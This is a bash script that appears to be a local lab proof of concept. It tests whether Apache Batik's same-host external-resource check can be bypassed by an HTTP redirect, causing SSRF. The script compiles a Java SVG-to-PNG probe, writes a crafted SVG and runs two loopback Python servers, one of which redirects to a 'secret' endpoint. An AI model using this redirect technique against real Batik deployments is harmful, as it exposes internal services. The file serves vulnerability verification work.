#!/usr/bin/env bash
# Live-test O-2: SSRF via HTTP-redirect bypass of DefaultExternalResourceSecurity same-host check.
# docHost=127.0.0.1 ; resource same-host /redir -> 302 -> http://localhost:9999/secret (different host string) ;
# if :9999 /secret is hit, the same-host policy was bypassed via redirect under DEFAULT security.
set -uo pipefail
W=/tmp/batik-lab; cd "$W"
LIB=$(ls -d "$W"/batik-1.19/lib 2>/dev/null)
CP=$(printf '%s' "$W/batik-1.19/lib/*")
echo "=== classpath dir: $LIB ==="

# --- BatikProbe.java: render SVG via PNGTranscoder with a settable document URI ---
cat > BatikProbe.java <<'JAVA'
import org.apache.batik.transcoder.*;
import org.apache.batik.transcoder.image.PNGTranscoder;
import java.io.*;

public class BatikProbe {
  // args: <svgfile> <docURI|-> <onload true|false>
  public static void main(String[] a) throws Exception {
    String svg = a[0];
    String docURI = (a.length>1 && !a[1].equals("-")) ? a[1] : null;
    boolean onload = (a.length>2 && a[2].equals("true"));
    PNGTranscoder t = new PNGTranscoder();
    if (onload) t.addTranscodingHint(SVGAbstractTranscoder.KEY_EXECUTE_ONLOAD, Boolean.TRUE);
    TranscoderInput in = new TranscoderInput(new FileInputStream(svg));
    if (docURI != null) in.setURI(docURI);
    TranscoderOutput out = new TranscoderOutput(new FileOutputStream("/tmp/batik-lab/probe.out.png"));
    try { t.transcode(in, out); System.out.println("TRANSCODE_OK"); }
    catch (Throwable e) { System.out.println("TRANSCODE_ERR: " + e.getClass().getName()+": "+e.getMessage()); }
  }
}
JAVA
javac -cp "$CP" BatikProbe.java 2>&1 | head -20
[ -f BatikProbe.class ] && echo "COMPILED_OK" || { echo "COMPILE_FAILED"; exit 1; }

# --- SVG that references a same-host external image which will 302-redirect internally ---
cat > ssrf.svg <<'SVG'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <image x="0" y="0" width="20" height="20" xlink:href="http://127.0.0.1:8000/redir"/>
</svg>
SVG

# --- two-server harness: :8000 /redir -> 302 http://localhost:9999/secret ; :9999 /secret logs HIT ---
cat > servers.py <<'PY'
import http.server, threading, socketserver
HIT = {"secret": False}
class Redir(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/redir"):
            self.send_response(302)
            self.send_header("Location", "http://localhost:9999/secret")
            self.end_headers()
        else:
            self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
class Secret(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/secret"):
            HIT["secret"] = True
            print("SSRF_HIT /secret", flush=True)
            png = bytes.fromhex("89504e470d0a1a0a0000000d494844520000000100000001080600000"+"01f15c4890000000d49444154789c6360000002000100"+"0000ffff03000006000557bfabd40000000049454e44ae426082")
            self.send_response(200); self.send_header("Content-Type","image/png")
            self.send_header("Content-Length",str(len(png))); self.end_headers()
            try: self.wfile.write(png)
            except Exception: pass
        else:
            self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
def serve(port,h):
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("127.0.0.1",port),h) as s: s.serve_forever()
threading.Thread(target=serve,args=(8000,Redir),daemon=True).start()
threading.Thread(target=serve,args=(9999,Secret),daemon=True).start()
import time
for _ in range(60):
    time.sleep(0.5)
    if HIT["secret"]:
        print("RESULT: SSRF_CONFIRMED (redirect bypassed same-host policy)", flush=True); break
else:
    print("RESULT: NO_HIT (internal not reached)", flush=True)
PY

# start servers, run probe, collect result
python3 servers.py > /tmp/batik-lab/ssrf.result 2>&1 &
SRV=$!
sleep 1.5
echo "=== run BatikProbe (docURI=http://127.0.0.1:8000/doc.svg, DEFAULT security) ==="
timeout 40 java -cp "$CP:." BatikProbe /tmp/batik-lab/ssrf.svg http://127.0.0.1:8000/doc.svg false 2>&1 | head -10
sleep 3
echo "=== SSRF result ==="
cat /tmp/batik-lab/ssrf.result 2>/dev/null | tail -5
kill $SRV 2>/dev/null
echo "=== DONE ==="
